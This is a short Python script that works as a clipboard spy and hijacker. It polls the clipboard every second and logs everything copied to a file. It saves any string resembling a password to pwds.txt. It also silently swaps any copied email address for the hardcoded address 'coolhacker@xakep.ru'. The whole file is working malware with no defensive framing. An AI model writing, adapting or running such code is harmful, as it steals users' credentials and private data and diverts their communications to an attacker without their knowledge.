import pyperclip
import time
import re
import shutil
import datetime
import atexit


def is_email(input_str):
    pattern_email = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    match = re.match(pattern_email, input_str)
    if match:
        return True
    else:
        return False  

def is_password(input_str):
    pattern_pwd = r'^(?=.*[A-Za-z0-9])[^\n\s]{6,}$'
    match = re.match(pattern_pwd, input_str)
    if match:
        return True
    else:
        return False  
    
def rotate_logfile():
        # Get the current date and time
    current_datetime = datetime.datetime.now()
    formatted_datetime = current_datetime.strftime("%Y%m%d%H%M")

    # Define the old and new filenames
    old_filename = "monitoring.txt"
    new_filename = "monitoring_{}.txt".format(formatted_datetime)

    # Rename the file
    shutil.move(old_filename, new_filename)


with open("monitoring.txt", "w") as log, open("pwds.txt", "a") as pwd:
    # Register the rename_file function to be called when the program exits
    atexit.register(rotate_logfile)   
         
    old_buffer = ''

    while True:    
        s = pyperclip.paste()

        if(s != old_buffer):   
            print(s)
            log.write(s+"\n")
            log.flush()

            if is_password(s):
                pwd.write(s+"\n")
                pwd.flush()

            if is_email(s):
                pyperclip.copy('coolhacker@xakep.ru')
                #print(s)

            old_buffer = s
            
        time.sleep(1)







